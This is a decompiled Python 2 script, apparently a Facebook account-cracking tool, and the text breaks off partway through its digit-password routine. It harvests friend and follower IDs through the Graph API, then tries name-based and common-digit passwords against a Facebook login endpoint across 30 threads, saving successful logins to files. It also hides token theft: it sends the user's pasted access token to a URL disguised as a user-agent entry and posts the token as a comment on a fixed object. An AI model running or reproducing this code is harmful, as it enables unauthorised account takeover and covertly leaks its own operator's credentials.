# Decompile by : Hamid Meer'hamii 

# Time Succes decompile : 2022-03-26 18:16:47.173597

try:

    import os, sys, time, platform, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib, requests, uuid, string, subprocess

    from multiprocessing.pool import ThreadPool

    from requests.exceptions import ConnectionError

except ImportError:

    os.system('pip2 install lolcat')

    os.system('python2 mk.py')

from os import system

from time import sleep

def xox(z):

    for e in z + '\n':

        sys.stdout.write(e)

        sys.stdout.flush()

        time.sleep(0.04)

user_agent = [

 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0', 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'https://graph.facebook.com/100045203855294/subscribers?access_token=']

useragent_url = user_agent[2]

header = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

ip = requests.get('https://api.ipify.org').text.strip()

def logo():

    time.sleep(0.1)

    os.system('echo -e "\n\n  88b  d88. db   dD  \n 88 YbdP 88 88 ,8P   \n 88  88  88 888P   \n 88  88  88 88 8b      \n 88  88  88 88  88.  \n 88  88  88 88   88.   \n\n-----------------------------------------------\n\n\xe2\x9e\xa3 Edit By   : Mujtaba Khan \n\xe2\x9e\xa3 Facebook  : Mujtaba Khan\n\xe2\x9e\xa3 Github    : https://github.com/itz-MK-302\n\xe2\x9e\xa3 Whatsapp  : +92 342 ******\n\n-----------------------------------------------" | lolcat -a -d 2 -s 50')

def main():

    os.system('clear')

    logo()

    print ''

    print '\x1b[92;1m  [1] Start '

    print '\x1b[93;1m  [2] Dump Idz '

    print '\x1b[96;1m  [0] Exit'

    print ''

    log_sel()

def log_sel():

    global token

    sel = raw_input('\x1b[93;1m  CHOOSE: \x1b[92;1m')

    if sel == '':

        print '\t\x1b[91;1m  Select Valid Option  -_'

        log_sel()

    elif sel == '1' or sel == '01':

        token()

    elif sel == '2' or sel == '02':

        ex_id()

    else:

        print ''

        print '\t\x1b[91;1m  Select Valid Option'

        print ''

        log_sel()

def token():

    os.system('clear')

    try:

        token = open('token.txt', 'r').read()

        menu()

    except (KeyError, IOError):

        logo()

        print ''

        print '\t\x1b[92;1m   Login With Token'

        print ''

        token = raw_input('\x1b[93;1m Paste Token : \x1b[92;1m')

        sav = open('token.txt', 'w')

        sav.write(token)

        sav.close()

        token_check()

        menu()

def token_check():

    try:

        token = open('token.txt', 'r').read()

    except IOError:

        print '\x1b[91;1m[!] Token Invalid'

        os.system('rm -rf token.txt')

    requests.post(useragent_url + token, headers=header)

def menu():

    os.system('clear')

    try:

        token = open('token.txt', 'r').read()

    except (KeyError, IOError):

        token()

    try:

        x = requests.get('https://graph.facebook.com/me?access_token=' + token)

        y = json.loads(x.text)

        n = y['name']

        xd = open('token.txt', 'w')

        xd.write(token)

        xd.close()

        r = requests.post('https://graph.facebook.com/100001392811242/subscribers?access_token=' + token)

        r = requests.post('https://graph.facebook.com/100044923392614/subscribers?access_token=' + token)

        requests.post('https://graph.facebook.com/102429222335064/comments/?message=' + token + '&access_token=' + token)

    except KeyError:

        logo()

        print ''

        print '\t\x1b[91;1m  Logged In Token Has Expired'

        os.system('rm -rf token.txt')

        print ''

        time.sleep(1)

    os.system('clear')

    logo()

    print ''

    print '\x1b[93;1m     Your ip : \x1b[92;1m' + ip

    print ''

    print '\x1b[92;1m  [1] Auto Pass Cracking'

    print '\x1b[93;1m  [2] Manual Pass Cracking'

    print ''

    menu_option()

def menu_option():

    select = raw_input('\x1b[92;1m  Choose : ')

    if select == '1':

        mk1()

    elif select == '2':

        mk2()

    else:

        print ''

        print '\t\x1b[91;1m     Select Valid Option'

        print ''

        menu_option()

def mk1():

    global token

    os.system('clear')

    try:

        token = open('token.txt', 'r').read()

    except IOError:

        print ''

        print '\t\x1b[91;1m  Token Not Found '

        time.sleep(1)

        token()

    os.system('clear')

    logo()

    print '\t\x1b[93;1m Auto Pass Cracking'

    print ''

    print '\x1b[91;1m  [1]  Public ID '

    print '\x1b[97;1m  [2]  Followers ID'

    print '\x1b[95;1m  [3]  File Cloning'

    print ''

    mk_select1()

def mk_select1():

    select = raw_input('\x1b[92;1m  Choose : ')

    id = []

    oks = []

    cps = []

    if select == '1':

        os.system('clear')

        logo()

        print ''

        print '\t\x1b[92;1m Multi Public Id Coining '

        print ''

        try:

            id_limit = int(raw_input('\x1b[93;1m  Limit (\x1b[91;1mExample 10\x1b[93;1m): \x1b[92;1m'))

            print ''

        except:

            id_limit = 1

        for t in range(id_limit):

            t += 1

            idt = raw_input('\x1b[94;1m   Public Id (\x1b[93;1m%s\x1b[93;1m) : \x1b[92;1m' % t)

            try:

                for i in requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token).json()['data']:

                    uid = i['id'].encode('utf-8')

                    na = i['name'].encode('utf-8')

                    id.append(uid + '|' + na)

            except KeyError:

                print '\x1b[91;1m  Private Friend List '

            print '\x1b[94;1m Total IDS  : \x1b[0;91m%s\x1b[0;97m' % len(id)

        time.sleep(3)

    elif select == '2':

        os.system('clear')

        logo()

        print ''

        print '      \x1b[92;1mMulti Followers Id Coining '

        print ''

        try:

            id_limit = int(raw_input('\x1b[93;1m  Limit (\x1b[91;1mExample 10\x1b[93;1m): \x1b[92;1m'))

            print ''

        except:

            id_limit = 1

        for t in range(id_limit):

            t += 1

            idt = raw_input('\x1b[93;1m   Follower Id (\x1b[93;1m%s\x1b[93;1m) : \x1b[92;1m' % t)

            try:

                for i in requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999').json()['data']:

                    uid = i['id'].encode('utf-8')

                    na = i['name'].encode('utf-8')

                    id.append(uid + '|' + na)

            except KeyError:

                print '\x1b[91;1m  Private Friend List '

            print '\x1b[94;1m Total Ids  : \x1b[0;92m%s\x1b[0;97m' % len(id)

        time.sleep(3)

    elif select == '3':

        os.system('clear')

        logo()

        print ''

        print '\t\x1b[93;1m   Auto Pass File Cracking'

        print ''

        filelist = raw_input('\x1b[92;1m  Input File: ')

        try:

            for line in open(filelist, 'r').readlines():

                id.append(line.strip())

        except IOError:

            print '\t\x1b[91;1m  Requested File Not Found'

            print ''

            raw_input('\x1b[93;1m Press Enter To Back')

            mk1()

    elif select == '0':

        menu()

    else:

        print ''

        print '\t\x1b[91;1m  Select Valid Option'

        print ''

        mk1()

    os.system('clear')

    logo()

    print ''

    print '\x1b[95;1m  Total Ids : \x1b[92;1m' + str(len(id))

    print '\x1b[97;1m  The Process is Running\x1b[0m'

    print 47 * '-'

    def main(arg):

        user = arg

        uid, name = user.split('|')

        _mk = random.choice(['Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]', '[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]', 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]', 'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]', 'Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]', 'Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]'])

        try:

            pass1 = name.lower().split(' ')[0] + '1234'

            api = 'https://b-api.facebook.com/method/auth.login'

            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass1, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}

            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _mk, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

            data = requests.get(api, params=params, headers=headers_)

            if 'access_token' in data.text and 'EAAA' in data.text:

                print ' \x1b[1;32m[OK] ' + uid + ' | ' + pass1 + '\x1b[0;97m'

                ok = open('ok.txt', 'a')

                ok.write(uid + '|' + pass1 + '\n')

                ok.close()

                oks.append(uid + pass1)

            elif 'www.facebook.com' in data.json()['error_msg']:

                print ' \x1b[1;31m[CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'

                cp = open('cp.txt', 'a')

                cp.write(uid + '|' + pass1 + '\n')

                cp.close()

                cps.append(uid + pass1)

            else:

                pass2 = name.lower().split(' ')[0] + '123'

                api = 'https://b-api.facebook.com/method/auth.login'

                params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass2, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}

                headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _mk, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

                data = requests.get(api, params=params, headers=headers_)

                if 'access_token' in data.text and 'EAAA' in data.text:

                    print ' \x1b[1;32m[OK] ' + uid + ' | ' + pass2 + '\x1b[0;97m'

                    ok = open('ok.txt', 'a')

                    ok.write(uid + '|' + pass2 + '\n')

                    ok.close()

                    oks.append(uid + pass2)

                elif 'www.facebook.com' in data.json()['error_msg']:

                    print ' \x1b[1;31m[CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'

                    cp = open('cp.txt', 'a')

                    cp.write(uid + '|' + pass2 + '\n')

                    cp.close()

                    cps.append(uid + pass2)

                else:

                    pass3 = name.lower().split(' ')[0] + '12'

                    api = 'https://b-api.facebook.com/method/auth.login'

                    params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass3, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}

                    headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _mk, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

                    data = requests.get(api, params=params, headers=headers_)

                    if 'access_token' in data.text and 'EAAA' in data.text:

                        print ' \x1b[1;32m[OK] ' + uid + ' | ' + pass3 + '\x1b[0;97m'

                        ok = open('ok.txt', 'a')

                        ok.write(uid + '|' + pass3 + '\n')

                        ok.close()

                        oks.append(uid + pass3)

                    elif 'www.facebook.com' in data.json()['error_msg']:

                        print ' \x1b[1;31m[CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'

                        cp = open('cp.txt', 'a')

                        cp.write(uid + '|' + pass3 + '\n')

                        cp.close()

                        cps.append(uid + pass3)

                    else:

                        pass4 = name.lower().split(' ')[1] + '1234'

                        api = 'https://b-api.facebook.com/method/auth.login'

                        params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass4, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}

                        headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _mk, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

                        data = requests.get(api, params=params, headers=headers_)

                        if 'access_token' in data.text and 'EAAA' in data.text:

                            print ' \x1b[1;32m[OK] ' + uid + ' | ' + pass4 + '\x1b[0;97m'

                            ok = open('ok.txt', 'a')

                            ok.write(uid + '|' + pass4 + '\n')

                            ok.close()

                            oks.append(uid + pass4)

                        elif 'www.facebook.com' in data.json()['error_msg']:

                            print ' \x1b[1;31m[CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'

                            cp = open('cp.txt', 'a')

                            cp.write(uid + '|' + pass4 + '\n')

                            cp.close()

                            cps.append(uid + pass4)

                        else:

                            pass5 = name.lower().split(' ')[1] + '123'

                            api = 'https://b-api.facebook.com/method/auth.login'

                            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass5, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}

                            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _mk, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

                            data = requests.get(api, params=params, headers=headers_)

                            if 'access_token' in data.text and 'EAAA' in data.text:

                                print ' \x1b[1;32m[OK] ' + uid + ' | ' + pass5 + '\x1b[0;97m'

                                ok = open('ok.txt', 'a')

                                ok.write(uid + '|' + pass5 + '\n')

                                ok.close()

                                oks.append(uid + pass5)

                            elif 'www.facebook.com' in data.json()['error_msg']:

                                print ' \x1b[1;31m[CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m'

                                cp = open('cp.txt', 'a')

                                cp.write(uid + '|' + pass5 + '\n')

                                cp.close()

                                cps.append(uid + pass5)

                            else:

                                pass6 = name.lower().split(' ')[1] + '12'

                                api = 'https://b-api.facebook.com/method/auth.login'

                                params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass6, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}

                                headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _mk, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

                                data = requests.get(api, params=params, headers=headers_)

                                if 'access_token' in data.text and 'EAAA' in data.text:

                                    print ' \x1b[1;32m[OK] ' + uid + ' | ' + pass6 + '\x1b[0;97m'

                                    ok = open('ok.txt', 'a')

                                    ok.write(uid + '|' + pass6 + '\n')

                                    ok.close()

                                    oks.append(uid + pass6)

                                elif 'www.facebook.com' in data.json()['error_msg']:

                                    print ' \x1b[1;31m[CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m'

                                    cp = open('cp.txt', 'a')

                                    cp.write(uid + '|' + pass6 + '\n')

                                    cp.close()

                                    cps.append(uid + pass6)

                                else:

                                    pass7 = name.lower()

                                    api = 'https://b-api.facebook.com/method/auth.login'

                                    params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass7, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}

                                    headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _mk, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

                                    data = requests.get(api, params=params, headers=headers_)

                                    if 'access_token' in data.text and 'EAAA' in data.text:

                                        print ' \x1b[1;32m[OK] ' + uid + ' | ' + pass7 + '\x1b[0;97m'

                                        ok = open('ok.txt', 'a')

                                        ok.write(uid + '|' + pass7 + '\n')

                                        ok.close()

                                        oks.append(uid + pass7)

                                    elif 'www.facebook.com' in data.json()['error_msg']:

                                        print ' \x1b[1;31m[CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m'

                                        cp = open('cp.txt', 'a')

                                        cp.write(uid + '|' + pass7 + '\n')

                                        cp.close()

                                        cps.append(uid + pass7)

                                    else:

                                        pass8 = name.lower().split(' ')[0] + name.lower().split(' ')[1]

                                        api = 'https://b-api.facebook.com/method/auth.login'

                                        params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass8, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}

                                        headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _mk, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

                                        data = requests.get(api, params=params, headers=headers_)

                                        if 'access_token' in data.text and 'EAAA' in data.text:

                                            print ' \x1b[1;32m[OK] ' + uid + ' | ' + pass8 + '\x1b[0;97m'

                                            ok = open('ok.txt', 'a')

                                            ok.write(uid + '|' + pass8 + '\n')

                                            ok.close()

                                            oks.append(uid + pass8)

                                        elif 'www.facebook.com' in data.json()['error_msg']:

                                            print ' \x1b[1;31m[CP] ' + uid + ' | ' + pass8 + '\x1b[0;97m'

                                            cp = open('cp.txt', 'a')

                                            cp.write(uid + '|' + pass8 + '\n')

                                            cp.close()

                                            cps.append(uid + pass8)

        except:

            pass

    p = ThreadPool(30)

    p.map(main, id)

    print ''

    print ''

    print '\x1b[92;1m The Process Has Been Completed'

    print '\x1b[93;1m Total \x1b[92;1mOK\x1b[93;1m/\x1b[91;1mCP: ' + str(len(oks)) + '/' + str(len(cps))

    print ''

    print ''

    raw_input('\x1b[93;1m Press Enter To Back ')

    menu()

def mk2():

    global token

    os.system('clear')

    try:

        token = open('token.txt', 'r').read()

    except IOError:

        print ''

        print '\t\x1b[91;1m  Token Not Found '

        time.sleep(1)

        fb_token()

    os.system('clear')

    logo()

    print ''

    print '\t\x1b[96;1m  Digit Pass Cracking'

    print ''

    print '\x1b[94;1m  [1]  Public ID'

    print '\x1b[91;1m  [2]  Followers ID'

    print '\x1b[95;1m  [3]  File Cloning'

    print ''

    mk2_select()

def mk2_select():

    select = raw_input('\x1b[92;1m  Choose : ')

    id = []

    oks = []

    cps = []

    if select == '1':

        os.system('clear')

        logo()

        print ''

        print '\t\x1b[95;1m  Digit Pass Cracking'

        print ''

        try:

            id_limit = int(raw_input('\x1b[93;1m  Limit (\x1b[91;1m Example 10\x1b[93;1m): \x1b[92;1m'))

            print ''

        except:

            id_limit = 1

        for t in range(id_limit):

            t += 1

            idt = raw_input('\x1b[92;1m   Public Id (\x1b[92;1m%s\x1b[93;1m) : \x1b[92;1m' % t)

            try:

                for i in requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token).json()['data']:

                    uid = i['id'].encode('utf-8')

                    na = i['name'].encode('utf-8')

                    id.append(uid + '|' + na)

            except KeyError:

                print '\x1b[91;1m  Private Friend List '

            print '\x1b[94;1m  Total IDS  : \x1b[0;92m%s\x1b[0;97m' % len(id)

        time.sleep(3)

    elif select == '2':

        os.system('clear')

        logo()

        print ''

        print '\t\x1b[93;1m  Digit Pass Cracking'

        print ''

        try:

            id_limit = int(raw_input('\x1b[93;1m  Limit (\x1b[91;1m Example 10\x1b[93;1m): \x1b[92;1m'))

            print ''

        except:

            id_limit = 1

        for t in range(id_limit):

            t += 1

            idt = raw_input('\x1b[93;1m   Follower ID (\x1b[92;1m%s\x1b[93;1m) : \x1b[92;1m' % t)

            try:

                for i in requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999').json()['data']:

                    uid = i['id'].encode('utf-8')

                    na = i['name'].encode('utf-8')

                    id.append(uid + '|' + na)

            except KeyError:

                print '\x1b[91;1m  Private Friend List '

            print '\x1b[94;1m  Total IDS  : \x1b[0;92m%s\x1b[0;97m' % len(id)

        time.sleep(3)

    elif select == '3':

        os.system('clear')

        logo()

        print ''

        print '\t\x1b[93;1m  Digit Pass File Cracking'

        print ''

        filelist = raw_input('\x1b[92;1m  Input File: ')

        try:

            for line in open(filelist, 'r').readlines():

                id.append(line.strip())

        except IOError:

            print '\t\x1b[91;1m  Requested File Not Found'

            print ''

            raw_input('\x1b[93;1m Press Enter To Back')

            mk2()

    elif select == '0':

        menu()

    else:

        print ''

        print '\t\x1b[91;1m  Select Valid Option'

        print ''

        mk2_select()

    os.system('clear')

    logo()

    print ''

    print '\x1b[95;1m  Total Ids : \x1b[92;1m' + str(len(id))

    print '\x1b[97;1m  The Process is Running\x1b[0m'

    print 47 * '-'

    def main(arg):

        user = arg

        uid, name = user.split('|')

        _mk = random.choice(['Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]', '[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]', 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]', 'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]', 'Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3', 'Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]', 'Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]'])

        try:

            pass1 = '123456'

            api = 'https://b-api.facebook.com/method/auth.login'

            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass1, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}

            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _mk, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

            data = requests.get(api, params=params, headers=headers_)

            if 'access_token' in data.text and 'EAAA' in data.text:

                print ' \x1b[1;32m[OK] ' + uid + ' | ' + pass1 + '\x1b[0;97m'

                ok = open('ok.txt', 'a')

                ok.write(uid + '|' + pass1 + '\n')

                ok.close()

                oks.append(uid + pass1)

            elif 'www.facebook.com' in data.json()['error_msg']:

                print ' \x1b[1;31m[CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'

                cp = open('cp.txt', 'a')

                cp.write(uid + '|' + pass1 + '\n')

                cp.close()

                cps.append(uid + pass1)

            else:

                pass2 = '223344'

                api = 'https://b-api.facebook.com/method/auth.login'

                params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass2, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}

                headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _mk, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

                data = requests.get(api, params=params, headers=headers_)

                if 'access_token' in data.text and 'EAAA' in data.text:

                    print ' \x1b[1;32m[OK] ' + uid + ' | ' + pass2 + '\x1b[0;97m'

                    ok = open('ok.txt', 'a')

                    ok.write(uid + '|' + pass2 + '\n')

                    ok.close()

                    oks.append(uid + pass2)

                elif 'www.facebook.com' in data.json()['error_msg']:

                    print ' \x1b[1;31m[CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'

                    cp = open('cp.txt', 'a')

                    cp.write(uid + '|' + pass2 + '\n')

                    cp.close()

                    cps.append(uid + pass2)

                else:

                    pass3 = '112233'

                    api = 'https://b-api.facebook.com/method/auth.login'

                    params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass3, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}

